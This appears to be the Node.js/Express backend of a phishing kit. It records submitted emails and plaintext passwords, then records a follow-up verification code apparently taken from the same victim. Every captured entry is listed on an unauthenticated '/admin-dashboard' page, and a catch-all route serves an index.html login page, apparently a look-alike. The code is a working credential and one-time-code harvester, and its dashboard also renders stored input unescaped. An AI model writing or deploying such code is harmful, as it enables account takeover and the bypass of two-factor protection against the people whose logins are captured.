const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const app = express();

const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static(__dirname));

// Initialisation de la base de données SQLite
const db = new sqlite3.Database('./database.sqlite', (err) => {
  if (err) console.error("Erreur DB:", err.message);
  else console.log("Base de données SQLite connectée.");
});

// Création de la table des utilisateurs
db.run(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT,
    password TEXT,
    code TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

let currentUserId = null;

// Route 1 : Enregistrer Email + Password
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  
  db.run(`INSERT INTO users (email, password) VALUES (?, ?)`, [email, password], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    currentUserId = this.lastID; // Conserver l'ID pour le code
    res.json({ status: 'success', id: currentUserId });
  });
});

// Route 2 : Enregistrer le Code de vérification
app.post('/api/code', (req, res) => {
  const { code } = req.body;
  
  if (currentUserId) {
    db.run(`UPDATE users SET code = ? WHERE id = ?`, [code, currentUserId], (err) => {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ status: 'success' });
    });
  } else {
    db.run(`INSERT INTO users (code) VALUES (?)`, [code], (err) => {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ status: 'success' });
    });
  }
});

// Route 3 : LIEN POUR VOIR TOUTES LES DONNÉES ENREGISTRÉES
app.get('/admin-dashboard', (req, res) => {
  db.all(`SELECT * FROM users ORDER BY id DESC`, [], (err, rows) => {
    if (err) return res.status(500).send("Erreur lors de la lecture des données.");

    let html = `
      <!DOCTYPE html>
      <html lang="fr">
      <head>
        <meta charset="UTF-8">
        <title>Tableau de bord des données</title>
        <style>
          body { font-family: Arial, sans-serif; background: #f4f6f9; padding: 20px; }
          h1 { color: #333; }
          table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
          th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #ddd; }
          th { background-color: #0b57d0; color: white; }
          tr:hover { background-color: #f1f1f1; }
          .code { font-weight: bold; color: #d93025; }
        </style>
      </head>
      <body>
        <h1>Données enregistrées</h1>
        <table>
          <thead>
            <tr>
              <th>ID</th>
              <th>Adresse E-mail</th>
              <th>Mot de passe</th>
              <th>Code de vérification</th>
              <th>Date / Heure</th>
            </tr>
          </thead>
          <tbody>
    `;

    rows.forEach(row => {
      html += `
        <tr>
          <td>${row.id}</td>
          <td>${row.email || '-'}</td>
          <td>${row.password || '-'}</td>
          <td class="code">${row.code || '-'}</td>
          <td>${row.created_at}</td>
        </tr>
      `;
    });

    html += `
          </tbody>
        </table>
      </body>
      </html>
    `;

    res.send(html);
  });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server is running on port ${PORT}`);
});